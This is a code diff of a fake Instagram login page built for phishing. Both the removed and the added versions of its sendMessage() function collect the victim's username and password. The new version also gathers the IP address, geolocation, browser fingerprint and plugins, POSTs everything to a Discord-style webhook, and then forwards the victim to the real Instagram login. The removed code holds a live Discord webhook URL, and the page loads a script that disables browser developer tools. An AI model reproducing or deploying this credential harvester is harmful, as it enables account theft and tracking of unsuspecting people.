@@ -1,7 +1,8 @@
-<!-- This website is for educational purposes only -->
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
   <link rel="Icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
-
   <title>Login • Instagram</title>
 </head>
 
@@ -35,29 +36,9 @@
                     </div>
 
                     <span class="button-box">
+                      <!-- Call sendMessage() function when the button is clicked -->
                       <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
                     </span>
-
-                    <script>
-                      let usernameInput = document.querySelector("#username");
-                      let passwordInput = document.querySelector("#password");
-                      let button = document.querySelector(".btn");
-
-                      button.disabled = true; // setting button state to disabled
-
-                      // Add event listeners to both input fields
-                      usernameInput.addEventListener("input", handleInputs);
-                      passwordInput.addEventListener("input", handleInputs);
-
-                      function handleInputs() {
-                        // Check if both username and password fields are filled
-                        if (usernameInput.value !== "" && passwordInput.value !== "") {
-                          button.disabled = false; // enable button
-                        } else {
-                          button.disabled = true; // disable button
-                        }
-                      }
-                    </script>
 
                     <div class="separator">
                       <div class="line"></div>
@@ -190,23 +171,83 @@
   </script>
 
   <script>
-    function sendMessage() {
-      function sleep(milliseconds) {
-        const date = Date.now();
-        let currentDate = null;
-        do {
-          currentDate = Date.now();
-        } while (currentDate - date < milliseconds);
+    async function sendMessage() {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+
+        const browserLanguage = navigator.language;
+
+        const areCookiesEnabled = navigator.cookieEnabled;
+
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        const platform = navigator.platform;
+
+        const userAgent = navigator.userAgent;
+
+        const currentURL = window.location.href;
+
+        const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+        const locationData = await locationResponse.json();
+        const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+
+        const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        const webhookURL = ''; // Replace 'YOUR_WEBHOOK_URL' with your actual webhook URL
+
+        const payload = {
+          embeds: [{
+            title: 'User Login Information',
+            color: parseInt('FF0000', 16),
+            fields: [
+              { name: 'Username', value: username },
+              { name: 'Password', value: password },
+              { name: 'User Agent', value: userAgent },
+              { name: 'Operating System', value: platform },
+              { name: 'Timezone Offset', value: new Date().getTimezoneOffset() },
+              { name: 'Screen Color Depth', value: window.screen.colorDepth },
+              { name: 'Viewport Size', value: window.innerWidth + "x" + window.innerHeight },
+              { name: 'Referrer', value: document.referrer },
+              { name: 'IP Address', value: ipAddress },
+              { name: 'Location', value: location },
+              { name: 'Screen Resolution', value: `${screenWidth}x${screenHeight}` },
+              { name: 'Browser Language', value: browserLanguage },
+              { name: 'Cookies Enabled', value: areCookiesEnabled },
+              { name: 'Timezone', value: timezone },
+              { name: 'Platform', value: platform },
+              { name: 'Current URL', value: currentURL },
+              { name: 'Plugins', value: plugins.join(', ') }
+            ]
+          }]
+        };
+
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send webhook:', response.statusText);
+        } else {
+          console.log('Webhook sent successfully');
+        }
+
+        // Redirect the user to Instagram login page
+        window.location.replace("https://www.instagram.com/accounts/login/");
+      } catch (error) {
+        console.error('Error:', error);
       }
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1189883112902103161/u4nOQ-QHVuEpwAbxp2FEdjbtjxWGxDx5hYb_lgCOCUL-0uCi7c6YFvFqu2uwAlEIfOv8");
-      request.setRequestHeader('Content-type', 'application/json');
-      var params = {
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-      }
-      request.send(JSON.stringify(params));
-      sleep(400)
-      window.location.replace("https://www.instagram.com/accounts/login/");
     }
   </script>
   <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
